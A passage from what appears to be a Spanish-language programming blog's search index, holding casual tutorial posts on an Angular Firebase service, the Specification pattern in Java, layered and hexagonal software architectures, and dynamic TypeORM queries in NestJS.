Observable((observer: Observer&lt;any&gt;) =&gt; { onSnapshot( queryDocument, (snapshot) =&gt; onSnapshotNext(snapshot, observer), err =&gt; onSnapshotError(err, observer), () =&gt; onSnapshotComplete(observer)); }) return documentAdded$.pipe( share() ) }}Uso de FirebaseServiceInyección de FirebaseService en el módulo de la aplicación. esto es importante ya que definimos una interfaz como servicio. no utilizamos el decorador.import { InjectionToken, NgModule } from '@angular/core';import { AppComponent } from './app.component';export const DOCUMENT_SERVICE = new InjectionToken&lt;DocumentProvider&gt;('app.document.service');@NgModule({ declarations: [ AppComponent, ], imports: [ RouterModule.forRoot(routes), RegisterModule AppRoutingModule, SharedModule, ], providers: [{ provide: DOCUMENT_SERVICE, useClass: FirebaseService }], bootstrap: [AppComponent]})export class AppModule { }Uso de FirebaseService@Injectable({ providedIn: 'root'})export class MessageService { constructor(@Inject(DOCUMENT_SERVICE) private firebase: DocumentProvider) { } sendMessage(msg: Message){ return this.firebase.saveDocument('messages', msg) } getRealtimeMessages(): Observable&lt;Message&gt; { const adapter = (data: any): Message =&gt; ({ id: data['id'], message: data['message'], createdAt: data['createdAt'], images: data['images'] }) return this.firebase.onDocumentAdded('messages', adapter).pipe( filter(attack =&gt; attack.message !== null) ) }}## ConclusiónAca no hay concluciones hay memes." }, { "title": "¿Que es el Patron especification?", "url": "/posts/Specification-pattern/", "categories": "Programacion, Java, ArquitecturaSoftware", "tags": "java, patrones, arquitectura software", "date": "2022-09-17 20:32:00 -0300", "snippet": "¿Que es el Patron especification?El patrón Specification nos permite encapsular reglas de negocio, ya sean estas sencillas o complejas, de manera que sean reutilizables y fáciles de cambiar.Este patron fue adoptado para la arquitectura Domain Driven design para poder realizar operaciones de filtrados sobre entidadessatisfaciendo ciertas condiciones de la entidad.Basicamente una especificacion recibe una entidad (objeto o modelo) y este es evaluado por una condicion o regla de negocio.para que necesito esta wea?el punto fuerte de specification es que cada regla (specification) puede ser reutilizable y puede componerse de otras reglascreando un conjunto de specificaciones en una sola, la maravilla es que pasamos de lo siguiente:var productService = new ProductService();/** * Multiples metodos para busquedas Objetos tipo servicios con multiples lineas de codigo */List&lt;Product&gt; productsWithStockGreaterThan10 = productsService.findByWithStockGreaterThan10(10);List&lt;Product&gt; productsWithStockGreaterThan10AndOtherCondition = productsService.findByWithStockGreaterThan10AndOtherConditions(10, otherConditions...n);/** * y por debajo estos metodos con unos infernales if */if (product.getStock() &gt; 10 &amp;&amp; (product.getOtherPropod() != null &amp;&amp; product.getOtherPropd().equals(\"some f**cking condition\") )){ return \"product from a complex conditions\"}a esta maravilla:var productService = new ProductService();var specStock = new WithStockSpecificationGreaterThan10(10);/*** * un unico metodo para filtrado de entidades ( service.findSatisfiedBy(specStock) ) */List&lt;Product&gt; productsWithStockGreaterThan10 = productsService.findSatisfiedBy(specStock);var specStockAndOtherCondition = new OtherConditionSpecification() .and(specStock);List&lt;Product&gt; productsWithStockGreaterThan10AndOtherCondition = productsService.findSatisfiedBy(spec);/** * espicificaciones hechas por separadas y concatenables * */public class ByStockGreaterThan10Units extends CompositeSpecification&lt;Product&gt; { /** * Una condicion bien entendible testeable y reutilizable * @param candidate * @return */ @Override public boolean isSatisfiedBy(Product candidate) { return candidate.getStock() &gt; 10; }}Beneficios expresivo Condiciones y logicas de negocios especificas encapsuladas en una sola Specificacion. Puedes crear specificaciones nuevas a partir de otras mediante composicion utilizando operadores AND, OR y NOT Specificaciones Testeables individualmente y de forma compuesta Un unico punto de entrada que recibe una especificacion y devuelve Las entidades que cumplan con las condiciones o reglas de negocioContras Specification puede ser complejo de implemntar con SQL u ORM dependiendo del lenguaje o libreria de persistencia (ejemplo Java y su criteria api :fearful: ) Tus Specificaciones compuestas pueden necesitar de alguna estrategia de creacion como un builder o un factory dependiendo de tus necesidades.Testeable mantenible y reutilizablesComo dijimos con especification podremos testear nuetras condiciones y reutilizarlas. imaginemos el caso tipico de un CRUDpero uno que verdad en tu vida laboral y no en los tutoriales de “happy path” como los del maravilloso framework nestjs con gatos. te dare el caso de una api de consulta de productos que empezo con busqueda de los quiero todos, los quiero por esta id ahora los quiero por categoria ahora los quiero por tienda.parece sencillo, pero a medida que nuestro Product owner y usuarios consumieron agua llasca se pusieron muy creativos y nos piden mas weas le va aplicando condiciones y mas condiciones por propiedaes especificas calculos locosy todo para crear la super api de productoscomo enfrentamos esto pos compadre?como dijimos especification nos da las condiciones y las vamos a utilizar entonces el proimer paso es crear las condicionesbasta de hablar como cotorra y vamos al codigoprimero definiremos las interfaces base de nuestro patron del mal:/** * interfaz base que cumplira nuestra condicion * @param &lt;T&gt; */public interface ISpecification&lt;T&gt;{ boolean isSatisfiedBy(T candidate);}/** * utilizando el patron composite para extender la funcionalidad del Specification base definimos una interfaz que hereda de nuestra Specification Base * y definmos metodos que actuaran como condicionales basicos estos * reciben una Specification y debuelven otra compuesta * @param &lt;T&gt; */public interface ICompositeISpecification&lt;T&gt; extends ISpecification&lt;T&gt; { ICompositeISpecification&lt;T&gt; and(ICompositeISpecification&lt;T&gt; other) ; ICompositeISpecification&lt;T&gt; or(ICompositeISpecification&lt;T&gt; other); ICompositeISpecification&lt;T&gt; not();}Ya tenemos nuestras interfaces y definiremos las implementaciones para ICompositeISpecificationque serviran de operadores/** * Representa un AND operator * @param &lt;T&gt; */public class AndSpecification&lt;T&gt; extends CompositeSpecification&lt;T&gt; { private ICompositeISpecification&lt;T&gt; left; private ICompositeISpecification&lt;T&gt; right; public AndSpecification(ICompositeISpecification&lt;T&gt; left, ICompositeISpecification&lt;T&gt; right) { super(); this.left = left; this.right = right; } /** * recibe un candidato y evalua las operaciones mediante un and con las especificaciones contenidas en esta clase * @param candidate * @return */ @Override public boolean isSatisfiedBy(T candidate) { return this.left.isSatisfiedBy(candidate) &amp;&amp; this.right.isSatisfiedBy(candidate); }}lo mismo aplicado para los operadores OR y NOT/** * Not specification * @param &lt;T&gt; */public class NotSpecification&lt;T&gt; extends CompositeSpecification&lt;T&gt; { private ICompositeISpecification&lt;T&gt; spec; public NotSpecification(ICompositeISpecification&lt;T&gt; spec) { super(); this.spec = spec; } @Override public boolean isSatisfiedBy(T candidate) { return !this.spec.isSatisfiedBy(candidate); }}/** * OR specification * @param &lt;T&gt; */public class OrSpecification&lt;T&gt; extends CompositeSpecification&lt;T&gt; { private ICompositeISpecification&lt;T&gt; left; private ICompositeISpecification&lt;T&gt; right; public OrSpecification(ICompositeISpecification&lt;T&gt; left, ICompositeISpecification&lt;T&gt; right) { super(); this.left = left; this.right = right; } @Override public boolean isSatisfiedBy(T candidate) { return this.left.isSatisfiedBy(candidate) || this.right.isSatisfiedBy(candidate); }}Ahora nos queda implementar otra interfaz de CompositeSpecification la cual sera una clase abstracta e implementara la logica de los operadorespublic abstract class CompositeSpecification&lt;T&gt; implements ICompositeISpecification&lt;T&gt; { @Override public ICompositeISpecification&lt;T&gt; and(ICompositeISpecification&lt;T&gt; other) { return new AndSpecification&lt;T&gt;(this, other); } @Override public ICompositeISpecification&lt;T&gt; or(ICompositeISpecification&lt;T&gt; other) { return new OrSpecification&lt;T&gt;(this, other); } @Override public ICompositeISpecification&lt;T&gt; not() { return new NotSpecification&lt;T&gt;(this); }}ya tenemos nuestro patron listo para ser utilizadoimplementaremos unas especificaciones heredando de CompositeSpecification e implementando el metodoboolean isSatisfiedBy(T candidate)ahora este metodo contendra las logicas sobre una entidad Producto/** * Stocke mayor a 10 */public class ByStockGreaterThan10Units extends CompositeSpecification&lt;Product&gt; { @Override public boolean isSatisfiedBy(Product candidate) { return candidate.getStock() &gt; 10; }}/** * productos de cierto departamento */public class ByDepartmentSpecification extends CompositeSpecification&lt;Product&gt; { private Department department; public ByDepartmentSpecification(Department department) { this.department = department; } @Override public boolean isSatisfiedBy(Product candidate) { return candidate .getDepartment() .getId() .equals(this.department.getId()); }}Ahora implementaremos la logica de filtrado de nuestros productos solo crearemos el metodo findSatisfiedBy(ISpecification spec) el cual recibe una especification y devolvera nuestros productos@AllArgsConstructorpublic class ProductService { private List&lt;Product&gt; products; public List&lt;Product&gt; findSatisfiedBy(ISpecification&lt;Product&gt; spec) { return products .stream() .filter(spec::isSatisfiedBy) .collect(Collectors.toList()); }}Con estas lineas es suficiente para utiliar las specificationnuestro filter se basara en la specificacion obtenida e internamente esta especificacion puede estar compuesta por 1 o mas especificaciones utilizando operadores como and, or y not var filtered = products .stream() .filter(spec::isSatisfiedBy) .collect(Collectors.toList());Martin flower quien ideo esto https://www.martinfowler.com/apsupp/spec.pdfConclusiónNaaa de conclusiones solo memes" }, { "title": "5 Arquitecturas de software para tigres del código", "url": "/posts/5-Arquitecturas-de-software-para-tigres-del-codigo/", "categories": "backend, fullstack, software-engineer, hackcode", "tags": "arquitectura, hackcode", "date": "2022-09-12 07:10:00 -0300", "snippet": "5 arquitecturas de software para proyectos seriosCuando iniciamos a crear nuestros proyectos lo primero que nos enseñaron fue el patrón MVC o la arquitectura por capas con el tiempoTodos los proyectos se acercaron a más una arquitectura por capas, ya que que nuestros frameworks favoritos por debajo implementabanel patrón MVC. Pero a medida de tantos ejemplos con controller -&gt; service -&gt; repository -&gt; entities quedaron como un estándar en muchos proyectos de carácter profesional y a medida que crecía el proyecto te ibas llenando de clases services extremadamente complejas y un montón de entidadesA continuación les presentaré 5 enfoques al momento de estructurar los componentes de nuestras aplicaciones, desde un pequeño proyecto (como un microservicio) hasta una aplicación más compleja que necesite mayor mantenibilidad y facilidad de entendimiento.Modelo N capas (Común en tutoriales) 1-basic-layers├──  controllers│ ├──  OrderController.java│ └──  ProductController.java├──  entities│ ├──  Order.java│ └──  Product.java├──  repositories│ ├──  OrderRepository.java│ └──  ProductRepository.java└──  services ├──  OrderService.java └──  ProductService.javaEl primer ejemplo es el que más hemos usado al momento de crear aplicaciones básicas tanto productivas como para aprender el error que se comente al usar esta arquitectura en aplicaciones reales, es que si el proyecto crece seguimos agregando componentes como servicios repositorios o controladores y muchas veces las lógicas de servicios pueden a llegar a ser complejas y nos hará códigos intesteables si agregamos lógicas en los servicios como locos porque lo primero que nos enseñaron es que los servicios deben tener toda la lógica de negocio. Con esta premisa terminas teniendo servicios enormes llenos de responsabilidades y acoplado a otros componentes, lo cual a la larga te traera más dificultad de deducir que hace específicamente el servicioModelo N capas mejorado 2-n-layers├──  application│ ├──  OrderCreator.java│ ├──  OrderFinder.java│ └──  ProductCreator.java├──  controllers│ ├──  OrderController.java│ └──  ProductController.java├──  entities│ ├──  Order.java│ └──  Product.java├──  repositories│ ├──  OrderRepository.java│ └──  ProductRepository.java└──  services ├──  OrderService.java └──  ProductService.javaEn este enfoque creamos capas adicionales acordes a las necesidades de nuestra aplicación, en este ejemplo se agrega la capa application la cual representará nuestros casos de uso y se comunicarán con las clases services entonces de esta manera separamos responsabilidades y le damos un poco más de sentido a la arquitectura N capas, ya que podríamos crear otra capa para resolver alguna nueva necesidad de la aplicación, por ejemplo que en un futuro necesitemos implementar un sistema de eventos.Modelo N Capas con enfoque al dominioEste ejemplo empieza a modelar la aplicación de una forma en que refleja mas el dominio del negocio de la aplicación definiendo como principales capas: domain: Modelo de negocio de nuestra aplicación dentro de esta capa consideramos repositorios entidades y nuestras clases de servicios como “servicios de dominios” son operaciones sobre las entidades application: Representará los casos de uso del negocio y contiene “servicios de aplicación” que son las lógicas más cercanas a la interacción de la aplicación con sus clientes. Adicionalmente, agregaremos componentes de software más alejados del dominio del negocio y más cercanos a implementaciones tecnológicas3-self-explain-domain-layers├── application│ ├── events│ │ └── OrderNotificationService.java│ ├── restcontrollers│ │ ├── OrderController.java│ │ └── ProductController.java│ └── services│ ├── OrderCreator.java│ ├── OrderFinder.java│ └── ProductCreator.java└── domain ├── entities │ ├── Order.java │ └── Product.java ├── repositories │ ├── OrderRepository.java │ └── ProductRepository.java └── services ├── OrderService.java └── ProductService.javaSus ventajas más admirables son que viendo la estructura del proyecto entenderemos de mejor manera la necesidad del negocio y el propósito de nuestra aplicación. A su vez observa que agregamos en application la capa events donde agregamos un nuevo servicio llamado OrderNotificationService.java el cual se encargará de las notificaciones y este podrá ser llamado por nuestros servicios de aplicación o casos de uso OrderCreator.javaArquitectura basada en módulos y capas orientadas al dominioLos anteriores ejemplos modelan la aplicación separadas en capas pero este enfoque tiene sus desventajas cuando el proyecto empieza a crecer. Acoplamiento de distintas funcionalidades entre entidades del dominio. Dificultad de entender partes específicas del sistema por la no separación de funcionalidades. La reutilización de entidades, servicios o repositorios evita modelar una funcionalidad basándonos en el caso de uso y te obliga a adecuarte a los componentes existentes. Cualquier cambio en componentes ya usados por otros pueden fallar, por lo que la cobertura de testing por más completa que sea siempre existirá el riesgo de comportamientos indeseados en producción.para solucionar esto tomaremos el modelo anterior y lo convertiremos a una aplicacion modular 4-modules-and-layers├──  modules│ ├──  order│ │ ├──  application│ │ │ ├──  events│ │ │ │ └──  OrderNotificationService.java│ │ │ ├──  restcontrollers│ │ │ │ └──  OrderController.java│ │ │ └──  services│ │ │ ├──  OrderCreator.java│ │ │ └──  OrderFinder.java│ │ └──  domain│ │ ├──  entities│ │ │ ├──  Order.java│ │ │ └──  OrderProduct.java│ │ ├──  repositories│ │ │ ├──  OrderProductRepository.java│ │ │ └──  OrderRepository.java│ │ └──  services│ │ └──  OrderService.java│ └──  product│ ├──  application│ │ ├──  restcontrollers│ │ │ └──  ProductController.java│ │ └──  services│ │ └──  ProductCreator.java│ └──  domain│ ├──  entities│ │ └──  Product.java│ ├──  repositories│ │ └──  ProductRepository.java│ └──  services│ └──  ProductService.java└──  shared ├──  config │ └──  Constants.java └──  utils ├──  DatetimeUtils.java └──  TextUtils.javaComo puedes apreciar cada módulo tiene sus propias capas, esto nos permite incluso dentro de un módulo escoger otra estructura de capas si lo estimas conveniente a su vez si observas el módulo order este posee su propia entidad Product la cual esta desacoplada del módulo productSi te preguntas ¿Qué consigo duplicando entidades de un ORM si puedo reusarla? La respuesta es que cuando modelas tu dominio debes hacerlo de acuerdo al objetivo de negocio y no de acuerdo al modelo de datos exacto, ya que cuando usas un ORM en algunos casos necesitaras ciertas configuraciones o relaciones que no encajaran con otros módulos de la aplicación con este enfoque te ahorras problemas de mapeo de la entidad a la tabla, ya que hay casos donde necesitas una carga perezosa de alguna relación, pero en otro caso de uso de la aplicación necesitara una carga temprana de esa entidad, entonces la independencia de los módulos es una ventaja enorme al modelar una nueva funcionalidad. En cuanto a la reutilización de módulos estos deberían exponer sus servicios mediante la capa aplicación y la definicion de DTOs. esta arquitectura es ideal para proyectos medianos o grandesArquitectura HexagonalLa arquitectura hexagonal o arquitectura de cebolla se enfoca en la definición del modelo de negocio como el corazón de nuestra aplicación capa “domain” esta capa es seguida por la encargada de representar los casos de uso “application” y finalmente tendremos nuestra capa de “infraestructura” la cual implementara todo el mundo externo de nuestra aplicación como librerías de terceros, frameworks, apis, protocolos, comunicación, orm, etc es decir todo lo que no sea nuestra lógica de negocio.La comunicación de las capas de domain, application e infraestructure se hace mediante componentes llamados “ports” y “adapters”que son básicamente interfaces y sus implementaciones para comunicar las capas de la arquitectura hexagonal.hexagonal├──  infraestructure│ ├──  order│ │ ├──  adapters│ │ │ ├──  events│ │ │ │ └──  RabbitMQOrderNotificator.java│ │ │ └──  repositories│ │ │ ├──  OrderEntity.java│ │ │ ├──  OrderProductEntity.java│ │ │ ├──  PostgresOrderProductRepository.java│ │ │ └──  PostgresOrderRespository.java│ │ └──  restcontrollers│ │ └──  OrderController.java│ ├──  product│ │ ├──  adapters│ │ │ └──  repositories│ │ │ ├──  PostgresProductRespository.java│ │ │ └──  ProductEntity.java│ │ └──  restcontrollers│ │ └──  ProductController.java│ └──  shared│ └──  utils│ └──  ThirdPartyLibraryDatetimeUtilImplementation.java├──  modules│ ├──  order│ │ ├──  application│ │ │ ├──  OrderCreator.java│ │ │ ├──  OrderFinder.java│ │ │ └──  ports│ │ │ └──  events│ │ │ └──  OrderNotificator.java│ │ └──  domain│ │ ├──  entities│ │ │ ├──  Order.java│ │ │ └──  OrderProduct.java│ │ ├──  ports│ │ │ └──  repositories│ │ │ ├──  OrderProductRepository.java│ │ │ └──  OrderRepository.java│ │ └──  services│ │ └──  OrderService.java│ └──  product│ ├──  application│ │ └──  ProductCreator.java│ └──  domain│ ├──  entities│ │ └──  Product.java│ ├──  ports│ │ └──  repositories│ │ └──  ProductRepository.java│ └──  services│ └──  ProductService.java└──  shared ├──  config │ └──  Constants.java └──  utils ├──  DatetimeUtils.java └──  TextUtils.javaPor ejemplo acá en nuestra capa de dominio tenemos las interface ProductRepository la cual es un puerto comunica nuestro dominio con una fuente de datos entonces en nuestra capa de infraestructura definimos una implementación de este puerto que sería nuestro adaptador en este caso seria PostgresProductRepository si te fijas nuestra implementación es bastante autoexplicativa ya sabes que hay metido un postgres en nuestra aplicación y si quieres puedes crear otro adaptador porque en un futuro se desea utilizar NoSql solo implementas un nuevo adapter o si en tus pruebas unitarias necesitas un mock de ProductRepository lo puedes crear implementando una clase de prueba sin necesidad de usar una librería de terceros para hacer un Mock del componenteLa arquitectura hexagonal es ideal para proyectos grandes y serios, ya que podrás implementar otras arquitecturas o estrategias dentro de la estructura, también es algo que debemos manejar a un nivel más abstracto y conceptual para entender como aplicarlo, encontraras un montón de implementaciones de hexagonal y ninguna estructura o nombres se parecen a esta o a las que veas, pero si debes entender los conceptos principalesCon la separación de la lógica del negocio, casos de usos, componentes externos y la definición de puertos y adaptadores lograrás mayor testeabilidad y mantenibilidad de tu maravillosa aplicación además de que el objetivo y las tecnologías empleadas se entienden a simple vista.Mi principal recomendación son estas 3 ultimas arquitecturasson mas autoexplicativas y pueden escalar a arquitecturas mas complejas sin perder mantenibilidad o testeabilidad de tu aplicaciónConclusión para la casa solo memes" }, { "title": "Creando queries dinámicas con Typeorm para flojear más. Quiero decir hacer menos código", "url": "/posts/creando-queries-dinamicas-con-typeorm/", "categories": "backend, orm, hackcode", "tags": "backend, typescript, hackcode, nestjs, nodejs", "date": "2022-08-03 06:10:00 -0400", "snippet": "Creando queries dinámicas con Typeorm para flojear más. Quiero decir hacer menos códigoMe encanta Typeorm su query builder permite crear complejas queries SQL al más estilo fluent API por abajo una implementación impecable de builder y otras patrañas. Vamos a un paso más adelante y crearemos una API con filtro dinámico donde la aplicación cliente pueda filtrar por el criterio o propiedades que le de la gana. Esto es bastante útil cuando NO quieres emplear un montón de condicionales Ifs, o quieres reutilizar alguna condicional en otra entidad.Vamos al código no más palabras que se las lleva el vientoLo primero será definir nuestra arquitectura, así de pro master hacker de nasa.La entidad a modo de prueba es Movement (robada de un proyecto) la cual representa movimientos de bodega imagínense que tienen miles propiedades para filtrar no coloco más por la flojera@Entity(\"movement\")export class Movement { @PrimaryGeneratedColumn(\"increment\", { type: \"integer\", name: \"movement_id\" }) movementId: number; @Column(\"character varying\", { name: \"sku\", default: null }) sku: string; @Column(\"character varying\", { name: \"description\", default: \"\" }) description: string; @Column(\"integer\", { name: \"qty\", default: 0 }) qty: number; @CreateDateColumn({ type: \"timestamptz\", name: \"created_at\" }) createdAt: Date; @Column({ name: \"warehouse_id\" }) warehouseId: number; @ManyToOne(() =&gt; Warehouse, (warehouse) =&gt; warehouse.warehouseId) @JoinColumn([{ name: \"warehouse_id\", referencedColumnName: \"warehouseId\" }]) warehouse: Warehouse; @ManyToOne(() =&gt; Reason, (reason) =&gt; reason.reasonId) @JoinColumn([{ name: \"reason_id\", referencedColumnName: \"reasonId\" }]) reason: Reason; @Column({ name: \"reason_id\" }) reasonId: number; @Column({ name: \"user_id\" }) userId: number; @ManyToOne(() =&gt; User, user =&gt; user.userId) @JoinColumn([{ name: \"user_id\", referencedColumnName: \"userId\" }]) user: User; @ManyToOne(() =&gt; Detail, detail =&gt; detail.movement, { cascade: true }) @JoinColumn({ name: \"detail_id\"}) detail: Detail;}La Arquitectura de nuestro hackAhora definimos nuestra interfaz Filter en la cual pondremos las propiedades disponibles a filtrar la estructura sería clave y valor de entrada para aplicar un filtro.export interface Filter { [x:string]: any;}Nuestra segunda definición es una Condición la cual la representaremos mediante una función usando type en vez de interface. Esta función recibe un SelectQueryBuilder objeto propio de Typeorm que se encarga de construir queries y un segundo parámetro que representa la condición de filtrado.export type Condition&lt;T&gt; = (qb: SelectQueryBuilder&lt;T&gt;, filterValue: any) =&gt; SelectQueryBuilder&lt;T&gt;;Ahora definiremos un tipo para el objeto que contendrá las condiciones este objeto implementara una estrategia de “clave” o nombre del filtro y su condición. Notese que la interfaz Filter y Conditions comparten la misma estructura. noten la magia de typescript ambas formas son igual de válidas.export type Conditions&lt;T&gt; = Record&lt;string, Condition&lt;T&gt;&gt;;Implementaremos el filtro deseado para nuestra entidad. Pondremos solo estas 3 propiedades a modo de ejemploexport interface MovementFilter extends Filter { sku: number; qty: number; warehouseId: number;}Y ahora se viene una de las partes interesantes del post. implementaremos una condición por la propiedad SKU o Stock Keeping Unit para los bilingües esto a modo de ejemplo.const movementConditions: Conditions&lt;Movement&gt; = { sku: (qb: SelectQueryBuilder&lt;Movement&gt;, sku: number) =&gt; qb.andWhere('m.sku = :sku', { 'sku': sku })}Para entender esta lógica solo debemos poner atención a la condición “m.sku = : sku”, ya que se preguntaran ¿de dónde diablos sale esa “m”? Pues bien cuando definimos una QueryBuilder con Typeorm podemos definir alias entonces “m” será el alias para la entidad Movement, ya que nuestra query base sería la siguiente:const qb = this.repository.createQueryBuilder('m') .innerJoin('m.detail', 'detail') .innerJoin('m.warehouse', 'warehouse')Asi que ven la maldita “m”.Muy bien ahora que entendemos la condición construida en la SelectQueryBuilder vemos que lo único que hace esta función de tipo Condition es recibir un SelectQueryBuilder construir la condición y agregar el valor como parámetro de la query y finalmente devolver el nuevo SelectQueryBuilder. Finalmente nuestro objeto conditions quedará de la siguiente forma:const movementConditions: Conditions&lt;Movement&gt; = { sku: (qb: SelectQueryBuilder&lt;Movement&gt;, sku: string) =&gt; qb.andWhere('m.sku = :sku', { 'sku': sku }), qty: (qb: SelectQueryBuilder&lt;Movement&gt;, qty: number) =&gt; qb.andWhere('m.qty = :qty', { 'qty': qty }), warehouseId: (qb: SelectQueryBuilder&lt;Movement&gt;, id: number) =&gt; qb.andWhere('warehouse.warehouse_id = :id', { 'id': id })}Un mónton de condiciones XD. Pero ya tenemos la lógica del filtro. Nada tan complicado. Y ahora viene la magia de que filtros aplicaremos. No es ciencia de cohetes ni nada si, pero si para mí la magia es que es lógica puramente funcional, en esta ocación a la casa la orientación a objeto o la programación imperativa XD, ya fuera de bromas este es el código y lo explicaré. esto es poesía a lo ñuñoino.parece enredado pero a la m** explicación es ahoraNuestra magia empieza con la función build mostrada. Esta recibe un objeto queryBuilderBase: SelectQueryBuilder,(typeorm object)y un objeto conditions: Conditions El cuál habíamos hablado previamenteEsta función la explicaré pasa a paso papitosfunction build&lt;T&gt;(queryBuilderBase: SelectQueryBuilder&lt;T&gt;, conditions: Conditions&lt;T&gt;, filter: Filter) { // filter conditions not undefined and reduce to final QueryBuilder const query: SelectQueryBuilder&lt;T&gt; = Object .keys(filter) //get keys from filter .filter(key =&gt; filter[key] !== undefined) // removing undefined filter values .reduce((prev: SelectQueryBuilder&lt;T&gt;, curr: string) =&gt; { const fn = conditions[curr] if (fn) { return fn(prev, filter[curr]) } return prev }, queryBuilderBase) // reducing to a SelectQueryBuilder with all conditions return query}Nos ayudamos de Object y su función keys que si le pasamos un objeto nos retorna sus keys entonces le pasamos nuestro objeto de tipo Filter para que nos retorne las keys del filtro que queremos aplicar, Muy bien como este ciudadano nos devuelve un arreglo de keys ahora le vamos a aplicar un filter() para eliminar los valores de tipo undefined al filtro aplicado o sea los valores que no hay que filtrar porque no tienen un valor definidoObject .keys(filter) //get keys from filter .filter(key =&gt; filter[key] !== undefined) // removing undefined filter valuesAhora usamos la función reduce() que muchos la ignoran como a la fea del baile, pero tiene sus gracias o si no pregúntele a redux y esas patrañas.reduce((prev: SelectQueryBuilder&lt;T&gt;, curr: string) =&gt; { const fn = conditions[curr] if (fn) { return fn(prev, filter[curr]) } return prev}, queryBuilderBase) Como aporta reduce a nuestro súper filtro dinámico, bueno reduce() funciona dándole como parámetros una función con un valor previo y un valor current que sería llamado como actual entonces con esos 2 valores debes devolver algo lo que tú desees una suma una resta, una comparación de objetos o lo que se te dé la gana entonces esta operación será una iteración sobre los datos o arreglo que tengas. Por último hay un tercer parámetro que es el valor inicial en nuestro caso sería nuestra query base.Explicado esto fíjense en que recibimos un SelectQueryBuilder entonces por cada key de las condiciones filtradas y válidas preguntamos por su condición del objeto Conditions y la si existe ejecutamos la condición que devuelve un nuevo SelectQueryBuilder y la devolvemos entonces el objeto estará con los nuevos filtro y condiciones/** * creamos la variable fn que es la que aplica la funcion de la condicion recordemos que curr es la key del filtro entonces si exite el filtro aplicamos la funcion de creacion de SelectQueryBuilder pasanodel el valor del filtro **/const fn = conditions[curr]if (fn) { return fn(prev, filter[curr])}Ahora creamos una clase con un método estático para poder hacer uso de nuestra utilidad y adjuntamos la estructura de Conditionsimport { SelectQueryBuilder } from \"typeorm\";/** * Las interfaces que definan la estructura de un filtro para una query deben heredar de esta interface */export interface Filter { [x:string]: any;}/** * Esta funcion recibe un SelectQueryBuilder&lt;T&gt; y un valor de filtro para ser aplicado en el objeto SelectQueryBuilder&lt;T&gt; */export type Condition&lt;T&gt; = (qb: SelectQueryBuilder&lt;T&gt;, filterValue: any) =&gt; SelectQueryBuilder&lt;T&gt;;/** * Representa un objeto clave Condicion donde la clave es el nombre del filtro */export type Conditions&lt;T&gt; = Record&lt;string, Condition&lt;T&gt;&gt;;/** * Clase con metodos de ayuda para crear Queries sobre la librería Typeorm */export class DynamicQueryBuilder { /** * Construye una nueva query a partir de una query base una serie de condiciones, un filtro con los valores * y un paginado opcional. * @param queryBuilderBase objeto SelectQueryBuilder&lt;T&gt; el que debe contener la sentenica basica de select * from de acuerdo a typeorm * @param conditions objeto clave Condition el cual contendra las condiciones opcionales de busqueda * @param filter objeto clave valor que contiene los campos a filtrar y su valor * @param page Representa un paginado opcional para las queries * @returns */ static build&lt;T&gt;(queryBuilderBase: SelectQueryBuilder&lt;T&gt;, conditions: Conditions&lt;T&gt;, filter: Filter) { // filter conditions not undefined and reduce to final QueryBuilder const query: SelectQueryBuilder&lt;T&gt; = Object .keys(filter) //get keys from filter .filter(key =&gt; filter[key] !== undefined) // removing undefined filter values .reduce((prev: SelectQueryBuilder&lt;T&gt;, curr: string) =&gt; { const fn = conditions[curr] if (fn) { return fn(prev, filter[curr]) } return prev }, queryBuilderBase) // reducing to a SelectQueryBuilder with all conditions return query }}Como nuestra función nos devuelve un objeto SelectQueryBuilder podremos agregar algún ordenamiento, límite y offset o condición obligatoria esto va a depender de nuestros casos de uso.Bueno vamos a juntar todo en un servicio con Nestjs que haga las consultas dinámicas@Injectable()export class MovementService { /** * Condiciones para el filtro **/ private movementConditions: Conditions&lt;Movement&gt; = { sku: (qb: SelectQueryBuilder&lt;Movement&gt;, sku: string) =&gt; qb.andWhere('m.sku = :sku', { 'sku': sku }), qty: (qb: SelectQueryBuilder&lt;Movement&gt;, qty: number) =&gt; qb.andWhere('m.qty = :qty', { 'qty': qty }), warehouseId: (qb: SelectQueryBuilder&lt;Movement&gt;, id: number) =&gt; qb.andWhere('warehouse.warehouse_id = :id', { 'id': id }) } constructor( @InjectRepository(Movement) private readonly repository: Repository&lt;Movement&gt; ) { } async findByFilter(filter: MovementFilter) { // build query base const qb = this.repository.createQueryBuilder('m') .innerJoin('m.detail', 'detail') .innerJoin('m.warehouse', 'warehouse') // building a dynamic SelectQueryBuilder const query = DynamicQueryBuilder.build&lt;Movement&gt;(qb, this.movementConditions, filter) // aditional conditions if you want return query.getMany() }}const filter: Filter = { sku: 9997687667; warehouseId: 230;}const movements = await this.movementService.findByFilter(filter)ConclusionesNada de conclusiones acá hay un meme" } ]
